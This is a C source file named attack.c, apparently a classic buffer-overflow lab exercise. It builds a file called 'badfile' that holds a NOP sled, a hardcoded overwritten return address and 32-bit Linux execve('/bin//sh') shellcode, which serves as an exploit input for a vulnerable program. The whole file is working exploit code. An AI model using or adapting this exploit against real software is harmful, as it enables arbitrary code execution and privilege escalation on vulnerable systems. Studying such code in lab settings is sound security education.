/* attack.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* Line1:	xorl    %eax,%eax              */
    "\x50"                 /* Line2:	pushl   %eax                   */
    "\x68""//sh"           /* Line3:	pushl   $0x68732f2f            */
    "\x68""/bin"           /* Line4:	pushl   $0x6e69622f            */
    "\x89\xe3"             /* Line5:	movl    %esp,%ebx              */
    "\x50"                 /* Line6:	pushl   %eax                   */
    "\x53"                 /* Line7:	pushl   %ebx                   */
    "\x89\xe1"             /* Line8:	movl    %esp,%ecx              */
    "\x99"                 /* Line9:	cdq                            */
    "\xb0\x0b"             /* Line10:	movb    $0x0b,%al              */
    "\xcd\x80"             /* Line11:	int     $0x80                  */
;

void main(int argc, char **argv)
{
    char buffer[460];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 460);

    /*Properly fill the buffer here*/
    /*ret = 0xbffff178 + 100;      replace the original return address*/
    buffer[44]=0xDC;
    buffer[45]=0xF1;
    buffer[46]=0xFF;
    buffer[47]=0xBF;
    int sizeofEnd = sizeof(buffer) - sizeof(shellcode);
    strcpy(buffer + sizeofEnd, shellcode);
    /*Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 460, 1, badfile);
    fclose(badfile);
}
